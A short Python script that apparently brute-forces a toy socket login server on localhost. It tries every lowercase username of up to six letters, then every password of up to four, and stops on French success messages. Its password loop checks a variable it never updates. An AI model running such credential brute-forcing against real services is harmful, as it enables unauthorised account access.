import socket
import string

host,port= "127.0.0.1", 1920
alphabet_list = list(string.ascii_lowercase)

s = socket.socket()
s.connect((host,port))

# Brutforce User
for nb in range(6):
    a = [i for i in alphabet_list]
    for y in range(nb):
        a = [x+i for i in alphabet_list for x in a]
    for user in a:
        s.send(user.encode("utf-8"))
        get = s.recv(512).decode()
        if get == "User correct !":
                break
    if get == "User correct !":
        break

# Brutforce Password
for nb in range(4):
    a = [i for i in alphabet_list]
    for y in range(nb):
        a = [x+i for i in alphabet_list for x in a]
    for user in a:
        s.send(user.encode("utf-8"))
        if s.recv(512).decode() == "Connexion réussie !":
            print("Connexion réussie !")
            break
    if get == "Connexion réussie !":
        break

s.close()